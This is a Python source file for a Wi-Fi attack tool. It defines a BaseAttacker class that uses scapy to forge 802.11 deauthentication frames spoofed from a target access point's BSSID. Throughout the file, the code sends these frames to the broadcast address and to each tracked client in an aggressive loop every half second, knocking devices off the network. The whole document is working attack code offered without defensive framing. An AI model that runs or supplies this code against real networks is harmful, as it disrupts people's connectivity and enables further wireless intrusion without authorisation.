import time
import threading
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
from logger import logger


class BaseAttacker:
    def __init__(self, interface, target_bssid, target_channel):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.clients = set()
        self.stop_deauth = False
        self.deauth_sent = 0

    def _get_interface_mac(self):
        try:
            from scapy.all import get_if_hwaddr
            return get_if_hwaddr(self.interface)
        except Exception:
            logger.warning(f"Could not get MAC for {self.interface}, using fake MAC")
            return "00:11:22:33:44:55"

    def _send_deauth_broadcast(self, count=5):
        try:
            pkt_bcast = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=self.target_bssid,
                addr3=self.target_bssid
            ) / Dot11Deauth(reason=7)
            sendp(pkt_bcast, iface=self.interface, count=count, verbose=False)
            self.deauth_sent += count
            return True
        except Exception as e:
            logger.debug(f"Broadcast deauth failed: {e}")
            return False

    def _send_deauth_to_client(self, client_mac, count=3):
        try:
            if client_mac.startswith(("33:33", "ff:ff", "01:00")):
                return False
            pkt_client = RadioTap() / Dot11(
                addr1=client_mac,
                addr2=self.target_bssid,
                addr3=self.target_bssid
            ) / Dot11Deauth(reason=7)
            sendp(pkt_client, iface=self.interface, count=count, verbose=False)
            self.deauth_sent += count
            return True
        except Exception as e:
            logger.debug(f"Client deauth failed for {client_mac}: {e}")
            return False

    def _deauth_loop_aggressive(self):
        try:
            while not self.stop_deauth:
                try:
                    self._send_deauth_broadcast(count=5)
                    current_clients = list(self.clients)
                    for client_info in current_clients:
                        client_mac = client_info[0] if isinstance(client_info, tuple) else client_info
                        self._send_deauth_to_client(client_mac, count=3)
                    time.sleep(0.5)
                except Exception as e:
                    logger.debug(f"Deauth loop error: {e}")
                    time.sleep(1)
        except Exception as e:
            logger.error(f"Deauth loop crashed: {e}")
